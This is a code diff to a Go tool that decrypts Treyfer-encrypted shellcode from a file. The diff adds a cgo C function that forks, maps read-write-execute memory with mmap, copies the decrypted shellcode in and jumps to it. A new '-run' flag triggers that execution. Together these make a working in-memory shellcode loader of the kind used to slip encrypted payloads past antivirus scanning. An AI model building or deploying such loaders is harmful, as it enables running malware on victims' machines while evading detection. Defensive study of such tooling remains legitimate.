@@ -5,7 +5,43 @@ import (
     "fmt"
     "io/ioutil"
     "math/bits"
+    "unsafe"
 )
+
+/*
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <unistd.h>
+
+void run_shellcode(char *shellcode, size_t shellcode_length)
+{
+    if(fork())
+    {
+        return;
+    }
+
+    unsigned char *ptr;
+    ptr = (unsigned char *) mmap(
+        0,
+        shellcode_length,
+        PROT_READ|PROT_WRITE|PROT_EXEC,
+        MAP_ANONYMOUS | MAP_PRIVATE,
+        -1,
+        0
+    );
+
+    if(ptr == MAP_FAILED)
+    {
+        perror("mmap");
+        return;
+    }
+
+    memcpy(ptr, shellcode, shellcode_length);
+    (*(void(*) ()) ptr)();
+}
+*/
+import "C"
 
 const NUM_ROUNDS uint = 128
 const PADDING_BLOCK_SIZE uint = 8
@@ -38,6 +74,10 @@ func remove_pkcs7_padding(src []byte, blockSize uint) []byte {
     }
 }
 
+/*
+References:
+- https://stackoverflow.com/questions/69066821/rijndael-s-box-in-c
+*/
 func calculate_sbox() [256]byte {
 
     var p byte = 1
@@ -79,6 +119,10 @@ func calculate_sbox() [256]byte {
     return sbox
 }
 
+/*
+References:
+- https://stackoverflow.com/questions/37303176/encryption-implementation-confusing-results
+*/
 func treyfer_decrypt(text [8]byte, key [8]byte, sbox [256]byte) [8]byte {
 
     var top uint8 = 0;
@@ -105,9 +149,11 @@ func main() {
 
     var input_file = flag.String("input", "encrypted.bin", "File containing the encrypted shellcode")
     var output_file = flag.String("output", "decrypted.bin", "Path of the output file")
+    var run_shellcode = flag.Bool("run", false, "Whether to run the decrypted shellcode")
+    
     flag.Parse()
 
-    if flag.NFlag() == 0 {
+    if flag.NFlag() < 2 {
         flag.Usage()
         return
     }
@@ -145,10 +191,28 @@ func main() {
     fmt.Printf("[+] Removing padding from the decrypted shellcode\n")
     decrypted_shellcode = remove_pkcs7_padding(decrypted_shellcode, PADDING_BLOCK_SIZE)
 
-    fmt.Printf("[+] Saving the encrypted shellcode into the output file\n")
+    fmt.Printf("[+] Saving the decrypted shellcode into the output file\n")
     err = ioutil.WriteFile(*output_file, decrypted_shellcode, 0644)
+
     if err != nil {
         fmt.Printf("[!] Error writing the encrypted shellcode to the output file\n")
         return
+    }
+
+    if *run_shellcode {
+
+        fmt.Printf("[+] Running the decrypted shellcode\n")
+
+        shellode_pointer := &decrypted_shellcode[0]
+        shellcode_length := len(decrypted_shellcode)
+
+        /*
+        call the the function run_shellcode, with the arguments:
+        - shellcode (address of the starting instruction to execute)
+        - shellcode_length (length of the shellcode (used by mmap))
+        */
+        C.run_shellcode(
+            (*C.char)(unsafe.Pointer(shellode_pointer)),
+            (C.size_t)(shellcode_length))
     }
 }
